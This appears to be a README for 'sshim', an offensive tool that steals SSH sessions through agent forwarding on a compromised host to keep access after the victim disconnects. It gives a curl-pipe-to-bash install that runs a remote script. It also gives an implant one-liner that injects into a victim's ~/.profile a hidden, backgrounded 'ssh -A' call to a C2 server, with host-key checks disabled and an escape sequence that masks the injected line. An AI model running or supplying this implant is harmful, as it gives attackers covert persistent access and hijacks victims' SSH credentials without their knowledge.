# sshim
SSHim - Shimming SSH as him

Steal SSH sessions from agent forwarding on a compromised host, enabling peristent access after agent disconnect


## Server Install

```bash
curl -fsSL https://raw.githubusercontent.com/B00TK1D/sshim/main/install.sh | bash
```



## Implant

```bash
  cat <(echo -e "ssh -A -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ssh@YOUR_C2_SERVER>/dev/null 2>&1 & disown #\033[2K\r") ~/.profile > /tmp/.profile && mv /tmp/.profile ~/.profile
```
